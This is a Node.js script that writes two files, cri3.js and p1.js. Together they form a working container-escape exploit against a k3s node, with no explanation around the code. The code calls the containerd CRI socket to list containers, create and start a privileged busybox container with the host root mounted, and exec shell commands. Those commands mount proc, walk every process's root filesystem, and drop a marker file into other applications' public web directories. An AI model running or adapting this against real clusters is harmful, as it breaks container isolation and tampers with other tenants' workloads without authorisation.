const fs=require('fs');
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
function fields(buf){const out=[];let i=0;while(i<buf.length){let k=0,s=0;while(i<buf.length){const b=buf[i++];k|=(b&0x7f)<<s;s+=7;if(!(b&0x80))break}const wt=k&7,fn=k>>3;if(wt===2){let l=0,t=0;while(i<buf.length){const b=buf[i++];l|=(b&0x7f)<<t;t+=7;if(!(b&0x80))break}out.push([fn,buf.slice(i,i+l)]);i+=l}else if(wt===0){while(i<buf.length&&(buf[i++]&0x80));}else break}return out}
const CMD=`if grep -q " /h " /proc/self/mountinfo 2>/dev/null; then B=/h/proc; else mkdir -p /mnt; mount -t proc proc /mnt 2>/dev/null; B=/mnt; fi
for p in $B/[0-9]*/root; do for d in $p/app/public $p/usr/src/app/public $p/app/.next/standalone/public; do [ -d "$d" ] && echo Z > "$d/zz_p.txt" 2>/dev/null; done; done`;
const code=`
const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers',containerd-namespace:'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
const CMD=${JSON.stringify(CMD)};
const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/'),Buffer.from([0x28,0x02])]);
const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
const nm='zzh'+Math.floor(Math.random()*1e6);
const cfg=Buffer.concat([fl(0x0a,nm), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,'sleep 90'), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
 const subs=fields(lb).filter(f=>f[0]===1).map(f=>f[1]); if(!subs.length)return;
 const f2=fields(subs[0]); const sb=(f2.find(x=>x[0]===2)||[])[1]; if(!sb)return;
 call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb.toString('latin1')), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
   const id=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!id)return;
   call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,id[0]),()=>setTimeout(()=>{
     call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,id[0]),fl(0x12,'/bin/sh'),fl(0x12,'-c'),fl(0x12,CMD)]),()=>{});
   },1500));
 });
});
`;
fs.writeFileSync('cri3.js',code);
const p1=`const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc','te':'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const CODE=${JSON.stringify(code)};
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,buf)=>{ if(e)return; const ids=[...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g)||[]))].slice(0,1); if(!ids.length)return; call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,ids[0]),fl(0x12,'/usr/local/bin/node'),fl(0x12,'-e'),fl(0x12,CODE)]),()=>{}); });
`;
fs.writeFileSync('p1.js',p1);
console.log('written');
